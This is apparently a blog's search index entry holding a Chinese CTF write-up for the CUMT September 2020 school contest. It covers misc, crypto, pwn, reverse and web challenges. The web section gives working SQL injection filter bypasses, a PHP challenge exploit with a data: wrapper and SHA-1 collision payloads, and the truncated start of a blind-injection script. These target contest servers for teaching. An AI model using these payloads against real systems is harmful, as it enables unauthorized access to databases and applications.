<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>cumt2020九月份校赛</title>
      <link href="/2020/09/27/cumt2020-jiu-yue-fen-xiao-sai/"/>
      <url>/2020/09/27/cumt2020-jiu-yue-fen-xiao-sai/</url>
      
        <content type="html"><![CDATA[<h2 id="MSIC"><a href="#MSIC" class="headerlink" title="MSIC"></a>MSIC</h2><h3 id="连签到都算不上"><a href="#连签到都算不上" class="headerlink" title="连签到都算不上"></a>连签到都算不上</h3><p>题目给出一个压缩包，看到里面txt，猜是base64加密后图片，解码后得到一个二维码，然后扫码得到\u开头的字符串，用java输出得到字符串，再用核心价值观解码，得到flag。</p><p>真·签到题</p><p>题目给了一个压缩包，猜测是伪加密。考虑到伪加密在kali，mac等系统中可直接打开。于是将压缩包拖到虚拟机中解压。</p><p>![img](../../../../medias/img//clip_image002 (2).jpg)</p><p>得到一个图片，将它放到winhex中分析发现最后有一串base64加密的字符串。</p><p>![img](../../../../medias/img//clip_image004 (2).jpg)</p><pre><code>Base64解密得到：EWOVEVH{U1ip_kp_uweeguuhw11a!} </code></pre><p>对比CUMTCTF{，，，}格式可以发现，将该字符串字母左移两位即可得到flag。</p><p>![img](../../../../medias/img//clip_image006 (2).jpg)</p><h3 id="兔兔那么可爱"><a href="#兔兔那么可爱" class="headerlink" title="兔兔那么可爱"></a>兔兔那么可爱</h3><p>题目给了一张图片和一个不知道什么格式的flag文件，根据hint，图片没什么用，将flag文件用txt打开，发现第12358个字符组成CUMTCT，猜测是斐波那契数列，于是写python脚本将对应位置的字符打印出来得到flag。</p><p>![img](../../../../medias/img//clip_image008 (2).jpg)</p><h3 id="别做题了听歌吧"><a href="#别做题了听歌吧" class="headerlink" title="别做题了听歌吧"></a>别做题了听歌吧</h3><p>题目给了一个MP3文件，应该是音频隐写，用工具MP3Stego，根据题目的提示“别问，问就是cumt”，猜测cumt是密码，于是解密得到</p><p><img src="../../../../medias/img//clip_image010.jpg" alt="img"></p><p>这样一个txt，打开发现是一堆长短不一的空白格，将其转换成Morse编码，有</p><p><img src="../../../../medias/img//clip_image012.jpg" alt="img"></p><p>解码得到<code>M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O</code></p><p>加上格式<code>CUMTCTF{M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O}</code>即为flag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="幼儿园的密码题"><a href="#幼儿园的密码题" class="headerlink" title="幼儿园的密码题"></a>幼儿园的密码题</h3><p>题目直接给出e,c,n</p><p><img src="../../../../medias/img//clip_image014.jpg" alt="img"></p><p>解出p,q</p><p><img src="../../../../medias/img//clip_image016.jpg" alt="img"></p><p>然后得到flag。</p><h3 id="小学生的密码题"><a href="#小学生的密码题" class="headerlink" title="小学生的密码题"></a>小学生的密码题</h3><p>阅读Python代码，显然最后编码后的结果以0为分界线，由于print去除了最后末尾的0，补全后，编码结果应该为：</p><p>```</p><p>21088410841088402108840420888888821088810888884210888888410888421088881088888820888841088842108820888881088884210888880888888408888888410</p><p>```</p><p>如果逆向出发未免太烦了，考虑到对于每个字符的编码函数为：</p><pre><code>    res = ""​    if i &gt;= 8:​      res += int(i/8)*"8"​     if i%8 &gt;=4:​      res += int(i%8/4)*"4"​    if i%4 &gt;=2:​      res += int(i%4/2)*"2"​    if i%2 &gt;= 1:​      res += int(i%2/1)*"1"</code></pre><p>将其处理成函数，将0-127的字符全部进行编码，形成哈希映射。</p><p>对编码后的结果以0为分隔符分割，得到list，而后迭代获取对应则得到了flag。</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>直接用nc连接上题目给的端口，肯定自己是个女生，然后得到学长base64加密的联系方式和密码，解密后，加上学长，然后就可以得到flag了。</p><h3 id="Babystack"><a href="#Babystack" class="headerlink" title="Babystack"></a>Babystack</h3><p>将题目文件拖进IDA然后简单分析，得到只要回答1_love_y0u就可以拿到shell，cat flag就行了</p><p><img src="../../../../medias/img//clip_image018.jpg" alt="img"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="re1-连个签到的分都不给你"><a href="#re1-连个签到的分都不给你" class="headerlink" title="re1-连个签到的分都不给你"></a>re1-连个签到的分都不给你</h3><p>直接拖进IDA用shift＋f12查看字符串得到flag</p><p><img src="../../../../medias/img//clip_image020.jpg" alt="img"></p><h3 id="re2-兄弟们快来帮帮萄萄"><a href="#re2-兄弟们快来帮帮萄萄" class="headerlink" title="re2-兄弟们快来帮帮萄萄"></a>re2-兄弟们快来帮帮萄萄</h3><p>根据题目提示，下载相应的upx版本，对题目文件进行脱壳，拖进IDA然后同第一题，直接shift+f12查看字符串得到flag</p><h3 id="re3-python题禁止py"><a href="#re3-python题禁止py" class="headerlink" title="re3-python题禁止py"></a>re3-python题禁止py</h3><p>根据题目python字节码反向写出python代码</p><p><img src="../../../../medias/img//clip_image022.jpg" alt="img"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h3><p>按照题目要求，构造GET 1和POST 2的语句</p><p><img src="../../../../medias/img//clip_image024.jpg" alt="img"></p><p>然后题目给出源码</p><p>直接加上file=flag.php</p><p>发现flag</p><p><img src="../../../../medias/img//clip_image026.jpg" alt="img"></p><h3 id="Babysqli"><a href="#Babysqli" class="headerlink" title="Babysqli"></a>Babysqli</h3><p>通过测试，发现空格和and会被检测，空格用/**/代替</p><p>通过union select挨个测试，发现长度为8，而且4有回显，</p><p>在4的位置直接用构造sql语句</p><p><img src="../../../../medias/img//clip_image028.jpg" alt="img"></p><p>得到<code>flag：CUMTCTF{27ec8034-c9fe-0cfd-d92a-84362ecf0e42}</code></p><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>打开发现是个图片，保存下来，用winhex打开，发现里面有php代码，保存下来（也能直接扫到<a href="http://www.zip,)/" target="_blank" rel="noopener">www.zip,）</a></p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Secret<span class="token operator">?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>The dream of a great singer<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./secret.jpg<span class="token punctuation">"</span></span>  <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>The dream of a great singer<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$str1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'Suvin_wants_a_girlfriend'</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Suvin doesn't like you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$str2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Suvin prefers strings of Numbers'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token operator">&lt;</span><span class="token number">3600</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Suvin says the num is too short'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token operator">></span><span class="token number">3600</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">31</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Suvin says the num is too long'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"Suvin says he's falling in love with you!"</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$str1</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$str2</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1000</span><span class="token punctuation">)</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"It's too long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$str1</span><span class="token operator">!==</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                 <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"It's so similar to md5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>用burpsuite抓包</p><p>利用data:协议绕过第一个die，利用16进制把2,592,001转变成0x278d01绕过第二个die，</p><p> 最后一个绕过sha1，由于string转换了下，所以不能用数组绕过，直接找sha1碰撞，谷歌放出了第一例sha1碰撞</p><p><a href="https://blog.csdn.net/caiqiiqi/article/details/68953730" target="_blank" rel="noopener">分析</a></p><p>payload：</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//202.119.201.197:13005/?param1=data:text/plain,Suvin_wants_a_girlfriend&amp;param2=0x278d01</span><span class="token constant">POST</span><span class="token punctuation">:</span>param1<span class="token operator">=</span><span class="token operator">%</span><span class="token constant">25PDF</span><span class="token number">-1.3</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token constant">E2</span><span class="token operator">%</span><span class="token constant">E3</span><span class="token operator">%</span><span class="token constant">CF</span><span class="token operator">%</span><span class="token constant">D3</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0A1</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span>20obj<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">3C</span><span class="token operator">%</span><span class="token constant">3C</span><span class="token operator">/</span>Width<span class="token operator">%</span><span class="token number">202</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Height<span class="token operator">%</span><span class="token number">203</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Type<span class="token operator">%</span><span class="token number">204</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Subtype<span class="token operator">%</span><span class="token number">205</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Filter<span class="token operator">%</span><span class="token number">206</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>ColorSpace<span class="token operator">%</span><span class="token number">207</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Length<span class="token operator">%</span><span class="token number">208</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>BitsPerComponent<span class="token operator">%</span><span class="token number">208</span><span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span>0Astream<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">D8</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">24SHA</span><span class="token number">-1</span><span class="token operator">%</span>20is<span class="token operator">%</span>20dead<span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">85</span><span class="token operator">/</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span>239u<span class="token operator">%</span><span class="token constant">9C9</span><span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token constant">C6</span><span class="token operator">%</span><span class="token constant">3CL</span><span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token constant">E1</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token constant">7FF</span><span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token constant">A6</span><span class="token operator">%</span><span class="token constant">B6</span><span class="token operator">%</span><span class="token constant">7E</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span><span class="token constant">9A</span><span class="token operator">%</span><span class="token constant">AA</span><span class="token operator">%</span><span class="token constant">1D</span><span class="token operator">%</span><span class="token constant">B2V</span><span class="token operator">%</span><span class="token constant">0BE</span><span class="token operator">%</span>CAg<span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token number">88</span><span class="token operator">%</span><span class="token constant">C7</span><span class="token operator">%</span><span class="token constant">F8K</span><span class="token operator">%</span>8CLy<span class="token operator">%</span><span class="token constant">1F</span><span class="token operator">%</span><span class="token constant">E0</span><span class="token operator">%</span><span class="token constant">2B</span><span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span><span class="token constant">F6</span><span class="token operator">%</span><span class="token number">14</span><span class="token operator">%</span>F8m<span class="token operator">%</span>B1i<span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span>C5kE<span class="token operator">%</span><span class="token constant">C1S</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">%</span><span class="token constant">B7</span><span class="token operator">%</span><span class="token number">608</span><span class="token operator">%</span>E9rr<span class="token operator">/</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span>ADr<span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token constant">0EI</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token constant">E0F</span><span class="token operator">%</span><span class="token constant">C20W</span><span class="token operator">%</span><span class="token constant">0F</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">E1</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token constant">F5</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token number">94</span><span class="token operator">%</span><span class="token constant">2B</span><span class="token operator">%</span><span class="token constant">E35B</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">-</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token constant">0F</span><span class="token operator">%</span><span class="token constant">2A3</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token constant">C3</span><span class="token operator">%</span><span class="token constant">7F</span><span class="token operator">%</span><span class="token constant">AC5</span><span class="token operator">%</span><span class="token number">14</span><span class="token operator">%</span><span class="token constant">E7M</span><span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">%</span><span class="token constant">0F</span><span class="token operator">%</span><span class="token constant">2C</span><span class="token operator">%</span><span class="token constant">C1</span><span class="token operator">%</span>A8t<span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span>0Cx0Z<span class="token operator">%</span>21Vda0<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">89</span><span class="token operator">%</span>60k<span class="token operator">%</span><span class="token constant">D0</span><span class="token operator">%</span><span class="token constant">BF</span><span class="token operator">%</span><span class="token constant">3F</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A8</span><span class="token operator">%</span><span class="token constant">04F</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">&amp;</span>param2<span class="token operator">=</span><span class="token operator">%</span><span class="token constant">25PDF</span><span class="token number">-1.3</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token constant">E2</span><span class="token operator">%</span><span class="token constant">E3</span><span class="token operator">%</span><span class="token constant">CF</span><span class="token operator">%</span><span class="token constant">D3</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">0A1</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span>20obj<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">3C</span><span class="token operator">%</span><span class="token constant">3C</span><span class="token operator">/</span>Width<span class="token operator">%</span><span class="token number">202</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Height<span class="token operator">%</span><span class="token number">203</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Type<span class="token operator">%</span><span class="token number">204</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Subtype<span class="token operator">%</span><span class="token number">205</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Filter<span class="token operator">%</span><span class="token number">206</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>ColorSpace<span class="token operator">%</span><span class="token number">207</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Length<span class="token operator">%</span><span class="token number">208</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>BitsPerComponent<span class="token operator">%</span><span class="token number">208</span><span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span>0Astream<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">D8</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">24SHA</span><span class="token number">-1</span><span class="token operator">%</span>20is<span class="token operator">%</span>20dead<span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">85</span><span class="token operator">/</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span>239u<span class="token operator">%</span><span class="token constant">9C9</span><span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token constant">C6</span><span class="token operator">%</span><span class="token constant">3CL</span><span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token constant">E1</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span>01sF<span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">%</span>91f<span class="token operator">%</span><span class="token constant">B6</span><span class="token operator">%</span><span class="token constant">7E</span><span class="token operator">%</span><span class="token number">11</span><span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span><span class="token constant">9A</span><span class="token operator">%</span><span class="token constant">B6</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token constant">B2V</span><span class="token operator">%</span><span class="token constant">0F</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span>CAg<span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">%</span><span class="token constant">A8</span><span class="token operator">%</span><span class="token constant">C7</span><span class="token operator">%</span><span class="token constant">F8</span><span class="token operator">%</span><span class="token constant">5B</span><span class="token operator">%</span>A8Ly<span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token constant">0C</span><span class="token operator">%</span><span class="token constant">2B</span><span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span><span class="token constant">E2</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>F8m<span class="token operator">%</span><span class="token constant">B3</span><span class="token operator">%</span><span class="token constant">A9</span><span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token constant">DFE</span><span class="token operator">%</span><span class="token constant">C1O</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">%</span><span class="token constant">B3</span><span class="token operator">%</span><span class="token constant">DC8</span><span class="token operator">%</span>E9j<span class="token operator">%</span><span class="token constant">C2</span><span class="token operator">/</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span>BDr<span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token constant">0EE</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token constant">E0F</span><span class="token operator">%</span><span class="token constant">D2</span><span class="token operator">%</span><span class="token constant">3CW</span><span class="token operator">%</span><span class="token constant">0F</span><span class="token operator">%</span><span class="token constant">EB</span><span class="token operator">%</span><span class="token number">14</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">BBU</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token constant">F5</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">A8</span><span class="token operator">%</span><span class="token constant">2B</span><span class="token operator">%</span><span class="token constant">E31</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token number">807</span><span class="token operator">%</span><span class="token constant">B8</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token constant">1F</span><span class="token operator">%</span><span class="token number">0E3</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token constant">AC5</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">EBM</span><span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token constant">C1</span><span class="token operator">%</span>A8dy<span class="token operator">%</span>0Cx<span class="token operator">%</span>2Cv<span class="token operator">%</span><span class="token constant">21V</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span><span class="token constant">DD0</span><span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span>D0k<span class="token operator">%</span><span class="token constant">D0</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">3F</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token constant">BCF</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">B1</span></code></pre><h3 id="Babysqli2"><a href="#Babysqli2" class="headerlink" title="Babysqli2"></a>Babysqli2</h3><p>本题中对单引号进行了禁用，利用转义使用后面password的单引号进行闭合，</p><p>空格使用/**/替代，使用or，left，right，ord避开ascii和substr函数的禁用</p><p><img src="../../../../medias/img//clip_image032.jpg" alt="img"></p><p>构建python脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://202.119.201.197:13004/index.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token 